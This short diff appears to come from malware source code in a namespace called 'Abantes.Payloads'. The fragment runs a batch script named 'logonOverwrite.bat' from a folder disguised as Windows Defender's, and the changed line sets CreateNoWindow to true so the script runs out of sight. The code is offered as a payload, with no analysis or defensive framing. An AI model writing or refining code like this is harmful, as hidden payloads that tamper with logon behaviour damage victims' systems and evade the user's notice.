@@ -118,7 +118,7 @@ namespace Abantes.Payloads
         {
             string extractPath = @"C:\Windows\Defender";
             Process ScriptProcess = new Process();
-            ScriptProcess.StartInfo.CreateNoWindow = false;
+            ScriptProcess.StartInfo.CreateNoWindow = true;
             ScriptProcess.StartInfo.UseShellExecute = false;
             ScriptProcess.StartInfo.FileName = extractPath + @"\logonOverwrite.bat"; 
             ScriptProcess.Start();
